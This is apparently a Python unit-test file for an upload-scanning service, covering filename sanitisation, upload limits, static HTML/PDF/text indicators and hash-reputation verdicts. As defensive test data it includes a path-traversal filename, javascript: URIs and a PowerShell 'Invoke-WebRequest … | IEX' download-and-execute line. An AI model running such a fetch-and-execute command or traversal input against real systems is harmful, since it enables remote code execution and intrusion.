import os
import tempfile
import unittest
from unittest.mock import patch

from services.file_analysis import analyze_file
from services.file_scan import safe_original_name, stream_upload
from services.html_static_analyzer import analyze_html_bytes
from services.lightweight_file_analyzer import analyze_lightweight_file


class Upload:
    def __init__(self, data):
        import io

        self.stream = io.BytesIO(data)


class FileScanTests(unittest.TestCase):
    def _temporary_file(self, data):
        file_handle = tempfile.NamedTemporaryFile(delete=False)
        file_handle.write(data)
        file_handle.close()
        return file_handle.name

    # ------------------------------------------------------------------
    # Upload safety
    # ------------------------------------------------------------------

    def test_filename_path_traversal_is_removed(self):
        name = safe_original_name("../../evil.html")
        self.assertNotIn("..", name)
        self.assertEqual(name, "evil.html")

    def test_empty_upload_rejected_and_cleaned(self):
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(
                ValueError,
                "empty_file",
            ):
                stream_upload(
                    Upload(b""),
                    directory,
                    100,
                )

            self.assertEqual(
                os.listdir(directory),
                [],
            )

    def test_oversized_upload_rejected_and_cleaned(self):
        with tempfile.TemporaryDirectory() as directory:
            with self.assertRaisesRegex(
                ValueError,
                "file_too_large",
            ):
                stream_upload(
                    Upload(b"12345"),
                    directory,
                    4,
                )

            self.assertEqual(
                os.listdir(directory),
                [],
            )

    # ------------------------------------------------------------------
    # Existing HTML static analysis
    # ------------------------------------------------------------------

    def test_html_scripts_are_static_indicators(self):
        result = analyze_html_bytes(
            b"<html>"
            b"<script>alert(1)</script>"
            b'<iframe src="https://example.com"></iframe>'
            b"</html>"
        )

        codes = {
            item["code"]
            for item in result["indicators"]
        }

        self.assertIn(
            "scripts_present",
            codes,
        )
        self.assertIn(
            "embedded_content",
            codes,
        )

    def test_html_dangerous_scheme_and_redirect(self):
        result = analyze_html_bytes(
            b'<meta http-equiv="refresh" content="0">'
            b'<a href="javascript:alert(1)">x</a>'
        )

        codes = {
            item["code"]
            for item in result["indicators"]
        }

        self.assertIn(
            "meta_redirect",
            codes,
        )
        self.assertIn(
            "dangerous_uri_scheme",
            codes,
        )

    # ------------------------------------------------------------------
    # Lightweight local analysis
    # ------------------------------------------------------------------

    def test_text_powershell_reference_is_suspicious(self):
        name = self._temporary_file(
            b"powershell.exe -Command Write-Host test"
        )

        try:
            indicators = analyze_lightweight_file(
                name,
                "text",
            )

            codes = {
                item["code"]
                for item in indicators
            }

            self.assertIn(
                "powershell_reference",
                codes,
            )
        finally:
            os.remove(name)

    def test_pdf_javascript_is_detected(self):
        name = self._temporary_file(
            b"%PDF-1.7\n"
            b"1 0 obj\n"
            b"<< /Type /Action /S /JavaScript "
            b"/JS (app.alert('test')) >>\n"
            b"endobj\n"
            b"%%EOF"
        )

        try:
            indicators = analyze_lightweight_file(
                name,
                "pdf",
            )

            codes = {
                item["code"]
                for item in indicators
            }

            self.assertIn(
                "pdf_javascript",
                codes,
            )
        finally:
            os.remove(name)

    def test_image_signature_mismatch_is_detected(self):
        name = self._temporary_file(
            b"this is not really a png file"
        )

        try:
            indicators = analyze_lightweight_file(
                name,
                "png",
            )

            codes = {
                item["code"]
                for item in indicators
            }

            self.assertIn(
                "image_signature_mismatch",
                codes,
            )
        finally:
            os.remove(name)

    def test_single_powershell_reference_is_not_high_severity(self):
        name = self._temporary_file(
            b"Documentation: run powershell.exe to open PowerShell."
        )

        try:
            indicators = analyze_lightweight_file(
                name,
                "text",
            )

            powershell = next(
                item
                for item in indicators
                if item["code"] == "powershell_reference"
            )

            self.assertEqual(
                powershell["severity"],
                "medium",
            )

            self.assertNotIn(
                "combined_execution_pattern",
                {
                    item["code"]
                    for item in indicators
                },
            )
        finally:
            os.remove(name)

    def test_combined_execution_behavior_is_high_severity(self):
        name = self._temporary_file(
            b"powershell.exe "
            b"Invoke-WebRequest https://example.com/payload "
            b"| IEX"
        )

        try:
            indicators = analyze_lightweight_file(
                name,
                "text",
            )

            by_code = {
                item["code"]: item
                for item in indicators
            }

            self.assertIn(
                "combined_execution_pattern",
                by_code,
            )

            self.assertEqual(
                by_code["combined_execution_pattern"]["severity"],
                "high",
            )
        finally:
            os.remove(name)

    def test_pdf_uri_alone_is_low_severity(self):
        name = self._temporary_file(
            b"%PDF-1.7\n"
            b"1 0 obj\n"
            b"<< /URI (https://example.com) >>\n"
            b"endobj\n"
            b"%%EOF"
        )

        try:
            indicators = analyze_lightweight_file(
                name,
                "pdf",
            )

            uri_indicator = next(
                item
                for item in indicators
                if item["code"] == "pdf_external_uri"
            )

            self.assertEqual(
                uri_indicator["severity"],
                "low",
            )
        finally:
            os.remove(name)

    # ------------------------------------------------------------------
    # File-analysis aggregation
    # ------------------------------------------------------------------

    @patch(
        "services.file_analysis.check_file_hash_reputation",
        return_value={
            "available": True,
            "evidence_available": True,
            "positives": 0,
            "malicious": 0,
            "total": 70,
        },
    )
    def test_clean_text_with_clean_reputation(self, _):
        name = self._temporary_file(
            b"hello world"
        )

        try:
            result = analyze_file(
                name,
                "text",
                "0" * 64,
            )

            self.assertEqual(
                result["status"],
                "COMPLETED",
            )
            self.assertEqual(
                result["verdict"],
                "CLEAN_CHECKS_COMPLETED",
            )
            self.assertEqual(
                result["malware_status"],
                "reputation_clean",
            )
            self.assertIsNone(
                result["error_code"]
            )
        finally:
            os.remove(name)

    @patch(
        "services.file_analysis.check_file_hash_reputation",
        return_value={
            "available": True,
            "evidence_available": False,
            "positives": 0,
            "malicious": 0,
            "total": 0,
        },
    )
    def test_unknown_hash_uses_static_checks_without_claiming_av_clean(
        self,
        _,
    ):
        name = self._temporary_file(
            b"hello world"
        )

        try:
            result = analyze_file(
                name,
                "text",
                "0" * 64,
            )

            self.assertEqual(
                result["status"],
                "COMPLETED",
            )
            self.assertEqual(
                result["verdict"],
                "CLEAN_CHECKS_COMPLETED",
            )
            self.assertEqual(
                result["malware_status"],
                "static_checks_only",
            )
            self.assertEqual(
                result["error_code"],
                "malware_reputation_unavailable",
            )
        finally:
            os.remove(name)

    @patch(
        "services.file_analysis.check_file_hash_reputation",
        side_effect=RuntimeError(
            "provider unavailable"
        ),
    )
    def test_reputation_provider_failure_preserves_local_result(
        self,
        _,
    ):
        name = self._temporary_file(
            b"hello world"
        )

        try:
            result = analyze_file(
                name,
                "text",
                "0" * 64,
            )

            self.assertEqual(
                result["status"],
                "COMPLETED",
            )
            self.assertEqual(
                result["verdict"],
                "CLEAN_CHECKS_COMPLETED",
            )
            self.assertEqual(
                result["malware_status"],
                "static_checks_only",
            )
            self.assertEqual(
                result["error_code"],
                "malware_reputation_unavailable",
            )
        finally:
            os.remove(name)

    @patch(
        "services.file_analysis.check_file_hash_reputation",
        return_value={
            "available": True,
            "evidence_available": False,
            "positives": 0,
            "malicious": 0,
            "total": 0,
        },
    )
    def test_local_suspicious_indicator_is_not_clean(
        self,
        _,
    ):
        name = self._temporary_file(
            b"powershell.exe -Command Invoke-Test"
        )

        try:
            result = analyze_file(
                name,
                "text",
                "0" * 64,
            )

            self.assertEqual(
                result["status"],
                "COMPLETED",
            )
            self.assertEqual(
                result["verdict"],
                "SUSPICIOUS_INDICATORS",
            )
            self.assertEqual(
                result["malware_status"],
                "static_analysis_only",
            )
        finally:
            os.remove(name)

    @patch(
        "services.file_analysis.check_file_hash_reputation",
        return_value={
            "available": True,
            "evidence_available": True,
            "positives": 12,
            "malicious": 12,
            "total": 70,
        },
    )
    def test_malicious_hash_reputation_is_threat(
        self,
        _,
    ):
        name = self._temporary_file(
            b"ordinary test content"
        )

        try:
            result = analyze_file(
                name,
                "text",
                "a" * 64,
            )

            self.assertEqual(
                result["status"],
                "COMPLETED",
            )
            self.assertEqual(
                result["verdict"],
                "THREAT_DETECTED",
            )
            self.assertEqual(
                result["malware_status"],
                "malware_detected",
            )

            codes = {
                item["code"]
                for item in result["indicators"]
            }

            self.assertIn(
                "file_hash_reputation_detection",
                codes,
            )
        finally:
            os.remove(name)

    @patch(
        "services.file_analysis.check_file_hash_reputation",
        return_value={
            "available": True,
            "evidence_available": True,
            "positives": 3,
            "malicious": 0,
            "total": 70,
        },
    )
    def test_non_malicious_reputation_positives_are_suspicious(
        self,
        _,
    ):
        name = self._temporary_file(
            b"ordinary test content"
        )

        try:
            result = analyze_file(
                name,
                "text",
                "b" * 64,
            )

            self.assertEqual(
                result["status"],
                "COMPLETED",
            )
            self.assertEqual(
                result["verdict"],
                "SUSPICIOUS_INDICATORS",
            )
            self.assertEqual(
                result["malware_status"],
                "reputation_suspicious",
            )
        finally:
            os.remove(name)


if __name__ == "__main__":
    unittest.main()